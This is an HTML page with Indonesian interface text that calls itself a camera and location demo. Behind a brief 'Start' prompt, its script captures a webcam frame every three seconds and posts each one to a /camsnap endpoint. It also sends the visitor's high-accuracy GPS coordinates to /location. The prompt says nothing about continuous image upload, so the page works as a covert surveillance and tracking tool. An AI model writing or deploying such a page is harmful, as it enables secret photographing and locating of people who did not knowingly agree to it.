<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Camera & Location Demo</title>
<style>
  body { margin:0; font-family:sans-serif; text-align:center; background:#111; color:#fff; }
  #overlay { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,.7); }
  button { padding:12px 20px; font-size:16px; border-radius:8px; border:none; }
  video { width: 90%; max-width: 320px; margin-top: 16px; }
</style>
</head>
<body>

<div id="overlay">
  <div>
    <p>Aplikasi ini akan meminta akses kamera & lokasi untuk demo.</p>
    <button onclick="start()">Mulai</button>
  </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" hidden></canvas>
<p id="status"></p>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusEl = document.getElementById("status");

function start() {
  document.getElementById("overlay").style.display = "none";
  startCamera();
  sendLocation();
}

// 📷 Kamera (setelah user klik)
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    statusEl.textContent = "Kamera aktif";
    autoCapture();
  } catch (e) {
    statusEl.textContent = "Kamera error: " + e.message;
  }
}

// 🔁 Capture berkala
function autoCapture() {
  const ctx = canvas.getContext("2d");
  setInterval(() => {
    if (!video.videoWidth) return;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    const img = canvas.toDataURL("image/jpeg", 0.7);

    fetch("/camsnap", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({ image: img })
    }).catch(console.error);
  }, 3000);
}

// 📍 Lokasi (setelah user klik)
function sendLocation() {
  if (!navigator.geolocation) {
    statusEl.textContent += "\nGeolocation tidak didukung";
    return;
  }
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      fetch("/location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy
        })
      }).catch(console.error);
    },
    (err) => {
      statusEl.textContent += "\nLokasi error: " + err.message;
    },
    { enableHighAccuracy: true }
  );
}
</script>

</body>
</html>
